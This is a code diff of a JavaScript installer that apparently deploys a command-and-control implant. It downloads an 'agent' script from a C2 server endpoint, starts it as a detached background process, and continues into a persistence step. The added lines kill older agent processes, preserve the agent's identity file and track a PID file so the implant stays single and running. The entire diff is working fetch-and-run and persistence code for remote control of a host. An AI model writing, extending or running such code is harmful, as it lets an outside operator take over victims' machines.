@@ -216,9 +216,46 @@ function persistWindows(py) {
     if (!py) py = await installPython();
     log(`Using Python: ${py}`);
 
-    // Download agent
+    // Kill any existing agent processes before installing
+    info('Stopping any existing agent processes...');
+    try {
+        if (PLATFORM === 'win32') {
+            run('taskkill /F /IM python.exe /FI "WINDOWTITLE eq agent*" 2>nul || true', { silent: true });
+        } else {
+            run('pkill -f "agent.py" 2>/dev/null || true', { silent: true });
+            run('sleep 1', { silent: true });
+        }
+    } catch {}
+
+    // Download fresh agent.py (but KEEP existing .agent_id so identity is preserved)
+    const ID_FILE = path.join(AGENT_DIR, '.agent_id');
+    const existingId = fs.existsSync(ID_FILE) ? fs.readFileSync(ID_FILE, 'utf8').trim() : null;
+    if (existingId) {
+        log(`Preserving existing agent ID: ${existingId}`);
+    }
+
     await download(`${C2_BASE}/api/agent/generate?host=${C2_HOST}&port=${C2_PORT}`, AGENT_FILE);
     log(`Agent saved to ${AGENT_FILE}`);
+
+    // Restore agent ID if it existed (download overwrites agent.py but not .agent_id)
+    // .agent_id is a separate file so it's already preserved — just confirm
+    if (existingId && fs.existsSync(ID_FILE)) {
+        log(`Agent ID preserved: ${existingId}`);
+    }
+
+    // Write PID file path into a known location for deduplication
+    const PID_FILE = path.join(AGENT_DIR, 'agent.pid');
+
+    // Check if agent is already running via PID file
+    if (fs.existsSync(PID_FILE)) {
+        const oldPid = fs.readFileSync(PID_FILE, 'utf8').trim();
+        try {
+            process.kill(parseInt(oldPid), 0); // check if PID exists
+            warn(`Agent already running (PID ${oldPid}) — killing it first`);
+            process.kill(parseInt(oldPid), 'SIGTERM');
+            await new Promise(r => setTimeout(r, 1000));
+        } catch {} // PID not found — stale file
+    }
 
     // Start immediately
     info('Starting agent...');
@@ -227,6 +264,8 @@ function persistWindows(py) {
         detached: true, stdio: ['ignore', logStream, logStream]
     });
     child.unref();
+    // Write PID file
+    try { fs.writeFileSync(PID_FILE, String(child.pid)); } catch {}
     log(`Agent started (PID ${child.pid})`);
 
     // Persist
